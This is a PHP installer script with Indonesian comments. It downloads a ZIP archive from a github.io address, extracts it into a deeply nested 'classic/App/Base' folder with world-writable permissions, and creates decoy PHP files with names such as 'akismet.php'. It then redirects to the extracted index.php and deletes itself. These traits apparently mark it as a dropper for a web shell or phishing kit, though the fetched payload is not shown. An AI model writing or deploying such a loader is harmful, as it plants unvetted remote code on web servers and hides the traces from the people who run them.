<?php
set_time_limit(0);

// Minimal PHP (opsional tapi jelas)
if (version_compare(PHP_VERSION, '5.5.0', '<')) {
    die("Minimal butuh PHP 5.5. Versi saat ini: " . PHP_VERSION);
}

// Cek ekstensi CURL
if (!function_exists('curl_init')) {
    die("Extension cURL belum aktif. Aktifkan 'curl' di PHP.");
}

// Cek ekstensi ZIP (ZipArchive)
if (!class_exists('ZipArchive')) {
    die("Extension ZIP belum aktif (ZipArchive tidak tersedia). Aktifkan 'zip' di PHP.");
}

$url = "https://veitokonivinaka05-creator.github.io/privacy/diff/ex.zip";
$savePath  = __DIR__ . "/classic/App/Base/zip/ex.zip";
$packDir   = __DIR__ . "/classic/App/Base/";
$LockDir   = __DIR__ . "/classic/App/Base/assets/form";

// root folder classic (dipakai untuk membuat file tambahan)
$classicDir = __DIR__ . "/classic";

// --- Fungsi bantu untuk membuat direktori dengan aman ---
function createDir($path, $permission = 0755) {
    if (is_dir($path)) return true;
    // Coba buat dengan umask sementara 0 agar permission sesuai keinginan
    $oldUmask = umask(0);
    $result = mkdir($path, $permission, true);
    umask($oldUmask);
    if (!$result) {
        return false;
    }
    return true;
}

// --- Buat semua folder yang diperlukan ---
if (!createDir($packDir, 0777)) {
    die("Gagal membuat direktori: $packDir. Periksa izin folder induk.");
}
if (!createDir(dirname($savePath), 0777)) {
    die("Gajal membuat direktori zip: " . dirname($savePath));
}
if (!createDir($classicDir, 0777)) {
    die("Gagal membuat direktori classic: $classicDir");
}

// Tampilkan informasi permission folder classic untuk debugging
clearstatcache();
$perms = fileperms($classicDir);
if ($perms === false) {
    die("Tidak dapat membaca permission folder classic.");
}
echo "Permission folder classic: " . substr(sprintf('%o', $perms), -4) . "<br>\n";
if (function_exists('posix_getpwuid')) {
    $owner = posix_getpwuid(fileowner($classicDir));
    echo "Owner folder classic: " . ($owner['name'] ?? 'unknown') . "<br>\n";
}

// Download ZIP
echo "Mendownload ZIP dari $url ...<br>\n";
$fp = fopen($savePath, "w+");
if (!$fp) {
    die("Gagal membuka file untuk menulis: $savePath");
}

$ch = curl_init($url);
curl_setopt($ch, CURLOPT_FILE, $fp);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
curl_setopt($ch, CURLOPT_FAILONERROR, true);
curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 30);
curl_setopt($ch, CURLOPT_TIMEOUT, 0); // 0 = tidak dibatasi

$ok = curl_exec($ch);

if ($ok === false) {
    $err = curl_error($ch);
    curl_close($ch);
    fclose($fp);
    die("Gagal download file: " . $err);
}

$httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
curl_close($ch);
fclose($fp);

if ($httpCode >= 400) {
    @unlink($savePath);
    die("Download gagal. HTTP Code: " . $httpCode);
}

if (!file_exists($savePath) || filesize($savePath) == 0) {
    die("File ZIP tidak ditemukan atau kosong setelah download!");
}

echo "Download selesai. Mengekstrak ZIP...<br>\n";

// Ekstrak ZIP
$zip = new ZipArchive;
if ($zip->open($savePath) === TRUE) {
    if (!$zip->extractTo($packDir)) {
        $zip->close();
        die("Gagal mengekstrak ZIP, kemungkinan format tidak didukung server.");
    }
    $zip->close();

    // Hapus ZIP setelah ekstrak berhasil
    if (file_exists($savePath)) {
        unlink($savePath);
        echo "File ZIP telah dihapus setelah ekstraksi.<br>\n";
    }
} else {
    die("Gagal membuka ZIP.");
}

// Tambah folder & file baru dengan pemeriksaan ketat
$targets = [
    "Class/css.php",
    "Base/zip.php",
    "Style/color.php",
    "Plugins/akismet.php",
    "Block/asset.php",
    "App/string.php",
    "App/readable.php"
];

foreach ($targets as $relPath) {
    $fullPath = $classicDir . "/" . $relPath;
    $dir = dirname($fullPath);

    // Buat direktori jika belum ada
    if (!is_dir($dir)) {
        if (!createDir($dir, 0755)) {
            die("Gagal membuat direktori: $dir. Periksa izin folder '$classicDir'.");
        }
    }

    // Pastikan direktori dapat ditulisi
    if (!is_writable($dir)) {
        die("Direktori tidak writable: $dir. Periksa permission.");
    }

    // Tulis file
    if (file_put_contents($fullPath, "<?php\n// file $relPath\n") === false) {
        die("Gagal menulis file: $fullPath");
    }
}

echo "Semua file tambahan berhasil dibuat.<br>\n";

echo "Install selesai. Mengalihkan ke aplikasi...<br>\n";
echo '<meta http-equiv="refresh" content="4;url=classic/App/Base/index.php">';

@flush();
if (function_exists('fastcgi_finish_request')) {
    @fastcgi_finish_request();
}

// Hapus file install.php (opsional)
@unlink(__DIR__ . "/install.php");

exit;
?>
